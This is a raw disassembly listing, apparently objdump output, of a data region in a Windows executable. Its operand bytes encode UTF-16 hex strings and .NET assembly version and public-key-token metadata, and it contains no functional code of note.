  407fa3:	add    BYTE PTR fs:[ebp+0x0],bh
  407fa7:	jge    0x407fa9
  407fa9:	sub    ch,BYTE PTR [ebp+0x0]
  407fac:	jae    0x407fae
  407fae:	sub    eax,0x65006800
  407fb3:	add    BYTE PTR [eax+eax*1+0x70],ch
  407fb7:	add    BYTE PTR [edx],bh
  407fb9:	add    BYTE PTR [edi],ch
  407fbb:	add    BYTE PTR [edi],ch
  407fbd:	add    BYTE PTR [ebp+0x0],cl
  407fc0:	push   ebx
  407fc1:	add    BYTE PTR [esi],ch
  407fc3:	add    BYTE PTR [esi+0x0],dl
  407fc6:	push   ebx
  407fc7:	add    BYTE PTR [ebx+0x0],al
  407fca:	inc    ebx
  407fcb:	add    BYTE PTR [esi],ch
  407fcd:	add    BYTE PTR [esi+0x0],dh
  407fd0:	cmp    DWORD PTR [eax],eax
  407fd2:	xor    BYTE PTR [eax],al
  407fd4:	or     BYTE PTR [ecx],dh
  407fd6:	add    BYTE PTR [eax],dh
  407fd8:	add    BYTE PTR [esi],ch
  407fda:	add    BYTE PTR [eax],dh
  407fdc:	add    BYTE PTR [ebx],al
  407fde:	add    BYTE PTR [eax],al
  407fe0:	push   cs
  407fe1:	add    ecx,DWORD PTR [eax]
  407fe3:	add    BYTE PTR [esi],cl
  407fe5:	add    BYTE PTR [eax+0x300030],0x32
  407fec:	add    BYTE PTR [eax+eax*1],dh
  407fef:	xor    BYTE PTR [eax],al
  407ff1:	xor    BYTE PTR [eax],al
  407ff3:	xor    BYTE PTR [eax],al
  407ff5:	xor    BYTE PTR [eax],al
  407ff7:	xor    BYTE PTR [eax],al
  407ff9:	xor    al,0x0
  407ffb:	cmp    BYTE PTR [eax],al
  407ffd:	xor    BYTE PTR [eax],al
  407fff:	xor    BYTE PTR [eax],al
  408001:	xor    BYTE PTR [eax],al
  408003:	xor    BYTE PTR [eax],al
  408005:	xor    BYTE PTR [eax],al
  408007:	cmp    DWORD PTR [eax],eax
  408009:	xor    al,0x0
  40800b:	xor    BYTE PTR [eax],al
  40800d:	xor    BYTE PTR [eax],al
  40800f:	xor    BYTE PTR [eax],al
  408011:	xor    BYTE PTR [eax],al
  408013:	xor    BYTE PTR [eax],al
  408015:	xor    BYTE PTR [eax],al
  408017:	xor    BYTE PTR [eax],al
  408019:	add    BYTE PTR ss:[eax],dh
  40801c:	add    BYTE PTR [edx],dh
  40801e:	add    BYTE PTR [eax],dh
  408020:	add    BYTE PTR [eax],dh
  408022:	add    BYTE PTR [eax],dh
  408024:	add    BYTE PTR [eax],dh
  408026:	add    BYTE PTR [eax],dh
  408028:	add    BYTE PTR [eax],dh
  40802a:	add    BYTE PTR [edx],dh
  40802c:	add    BYTE PTR [eax+eax*1],dh
  40802f:	xor    BYTE PTR [eax],al
  408031:	xor    BYTE PTR [eax],al
  408033:	xor    BYTE PTR [eax],al
  408035:	xor    BYTE PTR [eax],al
  408037:	xor    eax,0x35003200
  40803c:	add    BYTE PTR [ebx],dh
  40803e:	add    BYTE PTR [eax+eax*1],dh
  408041:	xor    DWORD PTR [eax],eax
  408043:	xor    eax,DWORD PTR [eax]
  408045:	xor    DWORD PTR [eax],eax
  408047:	xor    BYTE PTR [eax],al
  408049:	xor    BYTE PTR [eax],al
  40804b:	xor    BYTE PTR [eax],al
  40804d:	xor    al,0x0
  40804f:	xor    BYTE PTR [eax],al
  408051:	xor    BYTE PTR [eax],al
  408053:	xor    BYTE PTR [eax],al
  408055:	xor    BYTE PTR [eax],al
  408057:	xor    BYTE PTR [eax],al
  408059:	xor    DWORD PTR [eax],eax
  40805b:	xor    BYTE PTR [eax],al
  40805d:	xor    BYTE PTR [eax],al
  40805f:	xor    BYTE PTR [eax],al
  408061:	xor    DWORD PTR [eax],eax
  408063:	xor    BYTE PTR [eax],al
  408065:	xor    BYTE PTR [eax],al
  408067:	data16 add BYTE PTR [ecx],dh
  40806a:	add    BYTE PTR [ecx],bh
  40806c:	add    BYTE PTR [esi+0x0],ah
  40806f:	xor    DWORD PTR [eax],eax
  408071:	arpl   WORD PTR [eax],ax
  408073:	aaa    
  408074:	add    BYTE PTR [edx+0x0],ah
  408077:	cmp    DWORD PTR [eax],eax
  408079:	arpl   WORD PTR [eax],ax
  40807b:	xor    DWORD PTR [eax],eax
  40807d:	xor    al,0x0
  40807f:	cmp    BYTE PTR [eax],al
  408081:	xor    al,BYTE PTR [eax]
  408083:	popa   
  408084:	add    BYTE PTR [edi],dh
  408086:	add    BYTE PTR [edi],dh
  408088:	add    BYTE PTR [edx+0x0],ah
  40808b:	add    BYTE PTR fs:[ebp+0x0],ah
  40808f:	add    BYTE PTR fs:[ecx],dh
  408092:	add    BYTE PTR [ebx+0x0],ah
  408095:	xor    BYTE PTR [eax],al
  408097:	add    BYTE PTR gs:[ecx+0x0],ah
  40809b:	xor    al,BYTE PTR [eax]
  40809d:	add    BYTE PTR ss:[eax+eax*1+0x64],ah
  4080a2:	add    BYTE PTR [ecx],bh
  4080a4:	add    BYTE PTR ds:0x30003900,dh
  4080aa:	add    BYTE PTR [eax],dh
  4080ac:	add    BYTE PTR ds:0x63006400,dh
  4080b2:	add    BYTE PTR [ebx],dh
  4080b4:	add    BYTE PTR [esi+0x0],ah
  4080b7:	cmp    DWORD PTR [eax],eax
  4080b9:	add    BYTE PTR gs:[eax],dh
  4080bc:	add    BYTE PTR [esi+0x0],ah
  4080bf:	xor    al,0x0
  4080c1:	popa   
  4080c2:	add    BYTE PTR [eax+eax*1+0x63],ah
  4080c6:	add    BYTE PTR [edx+0x0],ah
  4080c9:	bound  eax,QWORD PTR [eax]
  4080cb:	xor    eax,DWORD PTR [eax]
  4080cd:	add    BYTE PTR fs:[edx+0x0],ah
  4080d1:	add    BYTE PTR gs:[ebx],dh
  4080d4:	add    BYTE PTR [eax],bh
  4080d6:	add    BYTE PTR [eax],dh
  4080d8:	add    BYTE PTR [esi+0x0],ah
  4080db:	arpl   WORD PTR [eax],ax
  4080dd:	xor    eax,0x62003700
  4080e2:	add    BYTE PTR [edx+0x0],ah
  4080e5:	add    BYTE PTR gs:[edx],dh
  4080e8:	add    BYTE PTR [eax],bh
  4080ea:	add    BYTE PTR [edx],dh
  4080ec:	add    BYTE PTR [ecx],bh
  4080ee:	add    BYTE PTR [esi],dh
  4080f0:	add    BYTE PTR [eax],dh
  4080f2:	add    BYTE PTR [ecx],dh
  4080f4:	add    BYTE PTR [ecx+0x0],ah
  4080f7:	popa   
  4080f8:	add    BYTE PTR [ebx],dh
  4080fa:	add    BYTE PTR [edx],dh
  4080fc:	add    BYTE PTR ds:0x63006200,dh
  408102:	add    BYTE PTR [ecx],bh
  408104:	add    BYTE PTR [edx],dh
  408106:	add    BYTE PTR [ecx],bh
  408108:	add    BYTE PTR [edx],dh
  40810a:	add    BYTE PTR [edi],dh
  40810c:	add    BYTE PTR [edx+0x0],ah
  40810f:	cmp    BYTE PTR [eax],al
  408111:	aaa    
  408112:	add    BYTE PTR [esi+0x0],ah
  408115:	xor    al,BYTE PTR [eax]
  408117:	xor    al,0x0
  408119:	xor    DWORD PTR [eax],eax
  40811b:	arpl   WORD PTR [eax],ax
  40811d:	popa   
  40811e:	add    BYTE PTR [eax+eax*1+0x63],ah
  408122:	add    BYTE PTR [ecx],dh
  408124:	add    BYTE PTR [ecx],bh
  408126:	add    BYTE PTR [ecx],bh
  408128:	add    BYTE PTR [esi],dh
  40812a:	add    BYTE PTR [ecx+0x0],ah
  40812d:	bound  eax,QWORD PTR [eax]
  40812f:	cmp    DWORD PTR [eax],eax
  408131:	add    BYTE PTR ss:[ebp+0x0],ah
  408135:	xor    al,0x0
  408137:	xor    BYTE PTR [eax],al
  408139:	popa   
  40813a:	add    BYTE PTR [ecx],dh
  40813c:	add    BYTE PTR [edx],dh
  40813e:	add    BYTE PTR [ecx+0x0],ah
  408141:	popa   
  408142:	add    BYTE PTR [eax],dh
  408144:	add    BYTE PTR [eax+eax*1+0x36],ah
  408148:	add    BYTE PTR [ebp+0x0],ah
  40814b:	xor    al,0x0
  40814d:	bound  eax,QWORD PTR [eax]
  40814f:	xor    DWORD PTR [eax],eax
  408151:	data16 add BYTE PTR [ebp+0x0],ah
  408155:	cmp    BYTE PTR [eax],al
  408157:	xor    DWORD PTR [eax],eax
  408159:	xor    DWORD PTR [eax],eax
  40815b:	xor    eax,DWORD PTR [eax]
  40815d:	xor    BYTE PTR [eax],al
  40815f:	xor    al,BYTE PTR [eax]
  408161:	add    BYTE PTR fs:[ecx],bh
  408164:	add    BYTE PTR [ecx],bh
  408166:	add    BYTE PTR [ebx+0x0],ah
  408169:	arpl   WORD PTR [eax],ax
  40816b:	xor    eax,DWORD PTR [eax]
  40816d:	add    BYTE PTR fs:0x62006300,dh
  408174:	add    BYTE PTR [ecx],dh
  408176:	add    BYTE PTR [esi+0x0],ah
  408179:	cmp    DWORD PTR [eax],eax
  40817b:	xor    al,BYTE PTR [eax]
  40817d:	data16 add BYTE PTR [edi],dh
  408180:	add    BYTE PTR [eax],bh
  408182:	add    BYTE PTR [edx],dh
  408184:	add    BYTE PTR [eax+eax*1],dh
  408187:	cmp    BYTE PTR [eax],al
  408189:	add    BYTE PTR gs:[eax+eax*1],dh
  40818d:	add    BYTE PTR fs:[ebx+0x0],ah
  408191:	xor    al,BYTE PTR [eax]
  408193:	arpl   WORD PTR [eax],ax
  408195:	cmp    BYTE PTR [eax],al
  408197:	aaa    
  408198:	add    BYTE PTR [ecx+0x0],ah
  40819b:	data16 add BYTE PTR [ecx],dh
  40819e:	add    BYTE PTR [ecx+0x0],ah
  4081a1:	data16 add BYTE PTR [ecx],bh
  4081a4:	add    BYTE PTR [eax+eax*1+0x31],ah
  4081a8:	add    BYTE PTR [eax+eax*1+0x61],ah
  4081ac:	add    BYTE PTR [edi],dh
  4081ae:	add    BYTE PTR [ebx],dh
  4081b0:	add    BYTE PTR [ecx],dh
  4081b2:	add    BYTE PTR ds:0x34003700,dh
  4081b8:	add    BYTE PTR [ecx],dh
  4081ba:	add    BYTE PTR [edi],dh
  4081bc:	add    BYTE PTR [eax+eax*1+0x39],ah
  4081c0:	add    BYTE PTR [eax+eax*1+0x33],ah
  4081c4:	add    BYTE PTR [ebx+0x0],ah
  4081c7:	xor    al,BYTE PTR [eax]
  4081c9:	xor    BYTE PTR [eax],al
  4081cb:	xor    eax,0x64006400
  4081d0:	add    BYTE PTR [edx+0x0],ah
  4081d3:	aaa    
  4081d4:	add    BYTE PTR [edx+0x0],ah
  4081d7:	popa   
  4081d8:	add    BYTE PTR [edi],dh
  4081da:	add    BYTE PTR [ebx],dh
  4081dc:	add    BYTE PTR [esi],dh
  4081de:	add    BYTE PTR [eax],dh
  4081e0:	add    BYTE PTR [eax+eax*1],dh
  4081e3:	xor    eax,DWORD PTR [eax]
  4081e5:	aaa    
  4081e6:	add    BYTE PTR [ecx],dh
  4081e8:	add    BYTE PTR [esi],dh
  4081ea:	add    BYTE PTR [edi],dh
  4081ec:	add    BYTE PTR [ecx+0x0],ah
  4081ef:	add    BYTE PTR fs:[ebx+0x0],ah
  4081f3:	xor    al,BYTE PTR [eax]
  4081f5:	data16 add BYTE PTR [ecx+0x0],ah
  4081f9:	add    BYTE PTR gs:[eax+eax*1],dh
  4081fd:	popa   
  4081fe:	add    BYTE PTR [esi],dh
  408200:	add    BYTE PTR [ecx],dh
  408202:	add    BYTE PTR [eax+eax*1+0x32],ah
  408206:	add    BYTE PTR [ebx+0x0],ah
  408209:	popa   
  40820a:	add    BYTE PTR [edx],dh
  40820c:	add    BYTE PTR [esi+0x0],ah
  40820f:	popa   
  408210:	add    BYTE PTR [ecx],dh
  408212:	add    BYTE PTR [esi+0x0],ah
  408215:	xor    BYTE PTR [eax],al
  408217:	add    BYTE PTR ss:[eax+eax*1],dh
  40821b:	xor    BYTE PTR [eax],al
  40821d:	aaa    
  40821e:	add    BYTE PTR [eax+eax*1],dh
  408221:	xor    DWORD PTR [eax],eax
  408223:	xor    al,BYTE PTR [eax]
  408225:	data16 add BYTE PTR [eax],bh
  408228:	add    BYTE PTR [esi+0x0],ah
  40822b:	bound  eax,QWORD PTR [eax]
  40822d:	cmp    BYTE PTR [eax],al
  40822f:	popa   
  408230:	add    BYTE PTR [ebp+0x0],ah
  408233:	xor    BYTE PTR [eax],al
  408235:	data16 add BYTE PTR [ecx],bh
  408238:	add    BYTE PTR [eax+eax*1],dh
  40823b:	xor    eax,0x31003800
  408240:	add    BYTE PTR [edx],dh
  408242:	add    BYTE PTR [ecx+0x0],ah
  408245:	cmp    DWORD PTR [eax],eax
  408247:	xor    BYTE PTR [eax],al
  408249:	popa   
  40824a:	add    BYTE PTR [ebp+0x0],ah
  40824d:	xor    DWORD PTR [eax],eax
  40824f:	aaa    
  408250:	add    BYTE PTR [edx],dh
  408252:	add    BYTE PTR [esi+0x0],ah
  408255:	xor    al,BYTE PTR [eax]
  408257:	xor    al,BYTE PTR [eax]
  408259:	bound  eax,QWORD PTR [eax]
  40825b:	add    BYTE PTR fs:[edx],dh
  40825e:	add    BYTE PTR [eax],bh
  408260:	add    BYTE PTR [edx],dh
  408262:	add    BYTE PTR [ebx+0x0],ah
  408265:	cmp    BYTE PTR [eax],al
  408267:	and    BYTE PTR [ecx+0x0],ah
  40826a:	add    BYTE PTR gs:[eax+eax*1],dh
  40826e:	xor    DWORD PTR [eax],eax
  408270:	add    BYTE PTR gs:[edx],dh
  408273:	add    BYTE PTR [esi],dh
  408275:	add    BYTE PTR [ecx],dh
  408277:	add    BYTE PTR ds:0x37003800,dh
  40827d:	add    BYTE PTR [edi],dh
  40827f:	add    BYTE PTR [ebp+0x0],ah
  408282:	bound  eax,QWORD PTR [eax]
  408284:	cmp    DWORD PTR [eax],eax
  408286:	xor    BYTE PTR [eax],al
  408288:	add    BYTE PTR [eax+0x300030],0x32
  40828f:	add    BYTE PTR [eax+eax*1],dh
  408292:	xor    BYTE PTR [eax],al
  408294:	xor    BYTE PTR [eax],al
  408296:	xor    BYTE PTR [eax],al
  408298:	xor    BYTE PTR [eax],al
  40829a:	xor    BYTE PTR [eax],al
  40829c:	xor    al,0x0
  40829e:	cmp    BYTE PTR [eax],al
  4082a0:	xor    BYTE PTR [eax],al
  4082a2:	xor    BYTE PTR [eax],al
  4082a4:	xor    BYTE PTR [eax],al
  4082a6:	xor    BYTE PTR [eax],al
  4082a8:	xor    BYTE PTR [eax],al
  4082aa:	cmp    DWORD PTR [eax],eax
  4082ac:	xor    al,0x0
  4082ae:	xor    BYTE PTR [eax],al
  4082b0:	xor    BYTE PTR [eax],al
  4082b2:	xor    BYTE PTR [eax],al
  4082b4:	xor    BYTE PTR [eax],al
  4082b6:	xor    BYTE PTR [eax],al
  4082b8:	xor    BYTE PTR [eax],al
  4082ba:	xor    BYTE PTR [eax],al
  4082bc:	add    BYTE PTR ss:[eax],dh
  4082bf:	add    BYTE PTR [edx],dh
  4082c1:	add    BYTE PTR [eax],dh
  4082c3:	add    BYTE PTR [eax],dh
  4082c5:	add    BYTE PTR [eax],dh
  4082c7:	add    BYTE PTR [eax],dh
  4082c9:	add    BYTE PTR [eax],dh
  4082cb:	add    BYTE PTR [eax],dh
  4082cd:	add    BYTE PTR [edx],dh
  4082cf:	add    BYTE PTR [eax+eax*1],dh
  4082d2:	xor    BYTE PTR [eax],al
  4082d4:	xor    BYTE PTR [eax],al
  4082d6:	xor    BYTE PTR [eax],al
  4082d8:	xor    BYTE PTR [eax],al
  4082da:	xor    eax,0x35003200
  4082df:	add    BYTE PTR [ebx],dh
  4082e1:	add    BYTE PTR [eax+eax*1],dh
  4082e4:	xor    DWORD PTR [eax],eax
  4082e6:	xor    eax,DWORD PTR [eax]
  4082e8:	xor    DWORD PTR [eax],eax
  4082ea:	xor    BYTE PTR [eax],al
  4082ec:	xor    BYTE PTR [eax],al
  4082ee:	xor    BYTE PTR [eax],al
  4082f0:	xor    al,0x0
  4082f2:	xor    BYTE PTR [eax],al
  4082f4:	xor    BYTE PTR [eax],al
  4082f6:	xor    BYTE PTR [eax],al
  4082f8:	xor    BYTE PTR [eax],al
  4082fa:	xor    BYTE PTR [eax],al
  4082fc:	xor    DWORD PTR [eax],eax
  4082fe:	xor    BYTE PTR [eax],al
  408300:	xor    BYTE PTR [eax],al
  408302:	xor    BYTE PTR [eax],al
  408304:	xor    DWORD PTR [eax],eax
  408306:	xor    BYTE PTR [eax],al
  408308:	xor    BYTE PTR [eax],al
  40830a:	xor    al,BYTE PTR [eax]
  40830c:	aaa    
  40830d:	add    BYTE PTR [edx],dh
  40830f:	add    BYTE PTR [edi],dh
  408311:	add    BYTE PTR [ebx],dh
  408313:	add    BYTE PTR [esi],dh
  408315:	add    BYTE PTR [ecx+0x0],ah
  408318:	add    BYTE PTR fs:[esi],dh
  40831b:	add    BYTE PTR [ebp+0x0],ah
  40831e:	xor    eax,0x39006600
  408323:	add    BYTE PTR ds:0x36003800,dh
  408329:	add    BYTE PTR [edx+0x0],ah
  40832c:	popa   
  40832d:	add    BYTE PTR [ebx+0x0],ah
  408330:	xor    al,BYTE PTR [eax]
  408332:	add    BYTE PTR fs:0x31003300,dh
  408339:	add    BYTE PTR [ebp+0x0],ah
  40833c:	popa   
  40833d:	add    BYTE PTR [edx+0x0],ah
  408340:	arpl   WORD PTR [eax],ax
  408342:	xor    eax,DWORD PTR [eax]
  408344:	popa   
  408345:	add    BYTE PTR [ebx+0x0],ah
  408348:	arpl   WORD PTR [eax],ax
  40834a:	add    BYTE PTR ss:[esi],dh
  40834d:	add    BYTE PTR [esi],dh
  40834f:	add    BYTE PTR [ebx+0x0],ah
  408352:	xor    al,BYTE PTR [eax]
  408354:	data16 add BYTE PTR [eax],bh
  408357:	add    BYTE PTR [ebp+0x0],ah
  40835a:	arpl   WORD PTR [eax],ax
  40835c:	cmp    BYTE PTR [eax],al
  40835e:	aaa    
  40835f:	add    BYTE PTR [ecx],bh
  408361:	add    BYTE PTR [esi+0x0],ah
  408364:	popa   
  408365:	add    BYTE PTR [ecx],bh
  408367:	add    BYTE PTR [eax+eax*1],dh
  40836a:	data16 add BYTE PTR [eax],bh
  40836d:	add    BYTE PTR [esi+0x0],ah
  408370:	aaa    
  408371:	add    BYTE PTR [edx+0x0],ah
  408374:	xor    BYTE PTR [eax],al
  408376:	xor    eax,DWORD PTR [eax]
  408378:	xor    al,BYTE PTR [eax]
  40837a:	aaa    
  40837b:	add    BYTE PTR [eax+eax*1+0x32],ah
  40837f:	add    BYTE PTR [esi+0x0],ah
  408382:	data16 add BYTE PTR [edx],dh
  408385:	add    BYTE PTR [ebp+0x0],ah
  408388:	add    BYTE PTR fs:0x33003200,dh
  40838f:	add    BYTE PTR [eax+eax*1],dh
  408392:	xor    al,0x0
  408394:	cmp    BYTE PTR [eax],al
  408396:	data16 add BYTE PTR [eax],bh
  408399:	add    BYTE PTR [ebx],dh
  40839b:	add    BYTE PTR [ebx+0x0],ah
  40839e:	xor    eax,DWORD PTR [eax]
  4083a0:	add    BYTE PTR fs:0x35006300,dh
  4083a7:	add    BYTE PTR [eax+eax*1+0x64],ah
  4083ab:	add    BYTE PTR [edx],dh
  4083ad:	add    BYTE PTR [eax+eax*1+0x66],ah
  4083b1:	add    BYTE PTR [ebx+0x0],ah
  4083b4:	aaa    
  4083b5:	add    BYTE PTR [edx+0x0],ah
  4083b8:	arpl   WORD PTR [eax],ax
  4083ba:	cmp    DWORD PTR [eax],eax
  4083bc:	cmp    DWORD PTR [eax],eax
  4083be:	arpl   WORD PTR [eax],ax
  4083c0:	xor    eax,0x38003200
  4083c5:	add    BYTE PTR [esi],dh
  4083c7:	add    BYTE PTR [edx+0x0],ah
  4083ca:	xor    al,BYTE PTR [eax]
  4083cc:	arpl   WORD PTR [eax],ax
  4083ce:	xor    DWORD PTR [eax],eax
  4083d0:	xor    al,BYTE PTR [eax]
  4083d2:	xor    eax,0x31003100
  4083d7:	add    BYTE PTR [edi],dh
  4083d9:	add    BYTE PTR [edx+0x0],ah
  4083dc:	data16 add BYTE PTR ds:0x62006300,dh
  4083e3:	add    BYTE PTR [ebp+0x0],ah
  4083e6:	xor    al,BYTE PTR [eax]
  4083e8:	xor    al,0x0
  4083ea:	xor    al,BYTE PTR [eax]
  4083ec:	bound  eax,QWORD PTR [eax]
  4083ee:	cmp    DWORD PTR [eax],eax
  4083f0:	add    BYTE PTR fs:[eax+eax*1],dh
  4083f4:	xor    DWORD PTR [eax],eax
  4083f6:	aaa    
  4083f7:	add    BYTE PTR ds:0x37003000,dh
  4083fd:	add    BYTE PTR [ebx],dh
  4083ff:	add    BYTE PTR [edx],dh
  408401:	add    BYTE PTR [edx+0x0],ah
  408404:	xor    al,BYTE PTR [eax]
  408406:	bound  eax,QWORD PTR [eax]
  408408:	add    BYTE PTR fs:[esi+0x0],ah
  40840c:	data16 add BYTE PTR [ebp+0x0],ah
  408410:	add    BYTE PTR ss:[eax+eax*1],dh
  408414:	cmp    DWORD PTR [eax],eax
  408416:	arpl   WORD PTR [eax],ax
  408418:	add    BYTE PTR ss:[ebp+0x0],ah
  40841c:	data16 add BYTE PTR [edx+0x0],ah
  408420:	cmp    BYTE PTR [eax],al
  408422:	add    BYTE PTR gs:0x32003500,dh
  408429:	add    BYTE PTR [esi],dh
  40842b:	add    BYTE PTR [eax+eax*1+0x35],ah
  40842f:	add    BYTE PTR [edx],dh
  408431:	add    BYTE PTR [esi],dh
  408433:	add    BYTE PTR [esi+0x0],ah
  408436:	add    BYTE PTR fs:[eax+eax*1+0x31],ah
  40843b:	add    BYTE PTR [ebx],dh
  40843d:	add    BYTE PTR [eax],dh
  40843f:	add    BYTE PTR [eax],dh
  408441:	add    BYTE PTR [ecx],bh
  408443:	add    BYTE PTR ds:0x63006500,dh
  408449:	add    BYTE PTR [eax+eax*1+0x62],ah
  40844d:	add    BYTE PTR [edi],dh
  40844f:	add    BYTE PTR [edx+0x0],ah
  408452:	data16 add BYTE PTR [edx],dh
  408455:	add    BYTE PTR [ecx],dh
  408457:	add    BYTE PTR [eax],dh
  408459:	add    BYTE PTR [eax],bh
  40845b:	add    BYTE PTR [eax],dh
  40845d:	add    BYTE PTR [ecx],bh
  40845f:	add    BYTE PTR [ebx+0x0],ah
  408462:	add    BYTE PTR ss:[ebx+0x0],ah
  408466:	add    BYTE PTR fs:[ecx+0x0],ah
  40846a:	add    BYTE PTR fs:[eax],bh
  40846d:	add    BYTE PTR [eax],bh
  40846f:	add    BYTE PTR [edx],dh
  408471:	add    BYTE PTR [eax+eax*1],dh
  408474:	data16 add BYTE PTR [ecx+0x0],ah
  408478:	popa   
  408479:	add    BYTE PTR [ecx],bh
  40847b:	add    BYTE PTR [ecx+0x0],ah
  40847e:	arpl   WORD PTR [eax],ax
  408480:	xor    BYTE PTR [eax],al
  408482:	xor    eax,DWORD PTR [eax]
  408484:	xor    DWORD PTR [eax],eax
  408486:	xor    BYTE PTR [eax],al
  408488:	popa   
  408489:	add    BYTE PTR [ebx+0x0],ah
  40848c:	xor    eax,DWORD PTR [eax]
  40848e:	arpl   WORD PTR [eax],ax
  408490:	bound  eax,QWORD PTR [eax]
  408492:	popa   
  408493:	add    BYTE PTR [edx],dh
  408495:	add    BYTE PTR [ecx+0x0],ah
  408498:	popa   
  408499:	add    BYTE PTR [eax],dh
  40849b:	add    BYTE PTR ds:0x33003200,dh
  4084a1:	add    BYTE PTR ds:0x37003600,dh
  4084a7:	add    BYTE PTR [edx+0x0],ah
  4084aa:	xor    al,BYTE PTR [eax]
  4084ac:	add    BYTE PTR fs:[esi+0x0],ah
  4084b0:	popa   
  4084b1:	add    BYTE PTR [edi],dh
  4084b3:	add    BYTE PTR [esi+0x0],ah
  4084b6:	add    BYTE PTR gs:[edx],dh
  4084b9:	add    BYTE PTR ds:0x62003000,dh
  4084bf:	add    BYTE PTR [ebx],dh
  4084c1:	add    BYTE PTR [eax],dh
  4084c3:	add    BYTE PTR [esi+0x0],ah
  4084c6:	popa   
  4084c7:	add    BYTE PTR [ebx+0x0],ah
  4084ca:	bound  eax,QWORD PTR [eax]
  4084cc:	add    BYTE PTR fs:[esi],dh
  4084cf:	add    BYTE PTR [edx],dh
  4084d1:	add    BYTE PTR [eax+eax*1+0x34],ah
  4084d5:	add    BYTE PTR [ebp+0x0],ah
  4084d8:	arpl   WORD PTR [eax],ax
  4084da:	cmp    DWORD PTR [eax],eax
  4084dc:	cmp    DWORD PTR [eax],eax
  4084de:	bound  eax,QWORD PTR [eax]
  4084e0:	cmp    DWORD PTR [eax],eax
  4084e2:	xor    al,0x0
  4084e4:	popa   
  4084e5:	add    BYTE PTR [ebx+0x0],ah
  4084e8:	xor    al,0x0
  4084ea:	aaa    
  4084eb:	add    BYTE PTR [ebx+0x0],ah
  4084ee:	aaa    
  4084ef:	add    BYTE PTR [eax+eax*1+0x33],ah
  4084f3:	add    BYTE PTR [edx+0x0],ah
  4084f6:	xor    al,BYTE PTR [eax]
  4084f8:	cmp    BYTE PTR [eax],al
  4084fa:	data16 add BYTE PTR [ecx],dh
  4084fd:	add    BYTE PTR [esi+0x0],ah
  408500:	add    BYTE PTR ss:[ebp+0x0],ah
  408504:	xor    al,0x0
  408506:	arpl   WORD PTR [eax],ax
  408508:	cmp    BYTE PTR [eax],al
  40850a:	and    BYTE PTR [eax],bh
  40850c:	add    BYTE PTR [ecx],bh
  40850e:	add    BYTE PTR [eax],bh
  408510:	add    BYTE PTR [eax+eax*1],dh
  408513:	xor    eax,0x63006400
  408518:	add    BYTE PTR [eax+eax*1+0x38],ah
  40851c:	add    BYTE PTR [eax],dh
  40851e:	add    BYTE PTR [eax],bh
  408520:	add    BYTE PTR [eax],dh
  408522:	add    BYTE PTR [ebx+0x0],ah
  408525:	arpl   WORD PTR [eax],ax
  408527:	cmp    DWORD PTR [eax],eax
  408529:	xor    DWORD PTR [eax],eax
  40852b:	or     BYTE PTR [eax+0x20002c],0x56
  408532:	add    BYTE PTR [ebp+0x0],ah
  408535:	jb     0x408537
  408537:	jae    0x408539
  408539:	imul   eax,DWORD PTR [eax],0x6e006f
  40853f:	cmp    eax,0x31003100
  408544:	add    BYTE PTR [esi],ch
  408546:	add    BYTE PTR [eax],dh
  408548:	add    BYTE PTR [esi],ch
  40854a:	add    BYTE PTR [eax],dh
  40854c:	add    BYTE PTR [esi],ch
  40854e:	add    BYTE PTR [eax],dh
  408550:	add    BYTE PTR [eax+eax*1],ch
  408553:	and    BYTE PTR [eax],al
  408555:	inc    ebx
  408556:	add    BYTE PTR [ebp+0x0],dh
  408559:	ins    BYTE PTR es:[edi],dx
  40855a:	add    BYTE PTR [eax+eax*1+0x75],dh
  40855e:	add    BYTE PTR [edx+0x0],dh
  408561:	add    BYTE PTR gs:0x65006e00,bh
  408568:	add    BYTE PTR [ebp+0x0],dh
  40856b:	je     0x40856d
  40856d:	jb     0x40856f
  40856f:	popa   
  408570:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408574:	add    BYTE PTR [eax],ah
  408576:	add    BYTE PTR [eax+0x0],dl
  408579:	jne    0x40857b
  40857b:	bound  eax,QWORD PTR [eax]
  40857d:	ins    BYTE PTR es:[edi],dx
  40857e:	add    BYTE PTR [ecx+0x0],ch
  408581:	arpl   WORD PTR [eax],ax
  408583:	dec    ebx
  408584:	add    BYTE PTR [ebp+0x0],ah
  408587:	jns    0x408589
  408589:	push   esp
  40858a:	add    BYTE PTR [edi+0x0],ch
  40858d:	imul   eax,DWORD PTR [eax],0x65
  408590:	add    BYTE PTR [esi+0x0],ch
  408593:	cmp    eax,0x39003800
  408598:	add    BYTE PTR [eax],bh
  40859a:	add    BYTE PTR [eax+eax*1],dh
  40859d:	xor    eax,0x63006400
  4085a2:	add    BYTE PTR [eax+eax*1+0x38],ah
  4085a6:	add    BYTE PTR [eax],dh
  4085a8:	add    BYTE PTR [eax],bh
  4085aa:	add    BYTE PTR [eax],dh
  4085ac:	add    BYTE PTR [ebx+0x0],ah
  4085af:	arpl   WORD PTR [eax],ax
  4085b1:	cmp    DWORD PTR [eax],eax
  4085b3:	xor    DWORD PTR [eax],eax
  4085b5:	pop    es
  4085b6:	add    BYTE PTR [edx],al
  4085b8:	or     BYTE PTR ds:0x310120e,bl
  4085be:	and    BYTE PTR [eax],al
  4085c0:	add    DWORD PTR ds:0x1d020120,eax
  4085c6:	push   cs
  4085c7:	push   es
  4085c8:	and    BYTE PTR [edx],al
  4085ca:	add    DWORD PTR [ebx],eax
  4085cc:	adc    DWORD PTR [ebx+eax*1],edx
  4085cf:	and    BYTE PTR [eax],al
  4085d1:	or     BYTE PTR ds:0x3010220,al
  4085d7:	push   cs
  4085d8:	add    esp,DWORD PTR [eax]
  4085da:	add    BYTE PTR [esi],cl
  4085dc:	add    al,BYTE PTR [esi]
  4085de:	add    al,BYTE PTR [ebx]
  4085e0:	and    BYTE PTR [eax],al
  4085e2:	add    al,BYTE PTR [eax+eiz*1]
  4085e5:	add    DWORD PTR [ecx],eax
  4085e7:	add    al,BYTE PTR [esi+eax*1]
  4085ea:	sbb    eax,0x20071411
  4085ef:	add    al,BYTE PTR [edx]
  4085f1:	adc    DWORD PTR [ecx+edx*1],edx
  4085f4:	adc    al,0x3
  4085f6:	sub    BYTE PTR [eax],al
  4085f8:	push   cs
  4085f9:	add    ebp,DWORD PTR [eax]
  4085fb:	add    BYTE PTR [edx],al
  4085fd:	add    eax,DWORD PTR [esi]
  4085ff:	adc    DWORD PTR [esp+eax*1],edx
  408602:	add    DWORD PTR [eax],eax
  408604:	add    BYTE PTR [eax],al
  408606:	add    al,0x2
  408608:	add    BYTE PTR [eax],al
  40860a:	add    BYTE PTR [esp+eax*1],al
  40860d:	add    BYTE PTR [eax],al
  40860f:	add    BYTE PTR [eax+ecx*1],al
